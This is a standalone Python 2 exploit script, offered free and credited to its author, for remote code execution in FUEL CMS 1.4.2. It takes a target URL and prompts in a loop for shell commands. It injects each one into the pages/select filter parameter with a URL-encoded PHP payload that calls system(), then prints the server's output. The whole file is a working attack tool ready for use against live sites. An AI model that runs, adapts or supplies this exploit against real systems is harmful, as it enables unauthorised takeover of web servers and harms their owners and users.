#!/usr/bin/python
#It was developed by Salim Alk
#mass exploit rce fuel cms
#Free Script "_" 
#contact : http://facebook.com/SQmazine
#https://github.com/daylightstudio/FUEL-CMS/issues/478
#Imports Modules
try:
	import requests
except ImportError:
	print(" Install Modules requests ")
try:
	import urllib
except ImportError:
	print(" Install Modules urllib ")
y = '\033[33m'
r = '\033[31m'
figlet = """
                       ###############################################
                       #                                             #
                       #                 salim alk                   #
                       # single Exploit Rce Fuel Cms Version: 1.4.2  #
                       #                                             #
                       ###############################################

"""
import sys
import os
if len(sys.argv) != 2:
	print figlet
	print ("add http:// to target ")
	sys.exit("Usage: python %s <url>" % sys.argv[0])
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
	url = sys.argv[1]
	xxxx = raw_input(y+'cmd:')
	burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
	#proxy = {"http":"http://127.0.0.1:8080"}
	r = requests.get(burp0_url)

	html = "<!DOCTYPE html>"
	htmlcharset = r.text.find(html)

	begin = r.text[0:20]
	dup = find_nth_overlapping(r.text,begin,2)

	print r.text[0:dup]
            
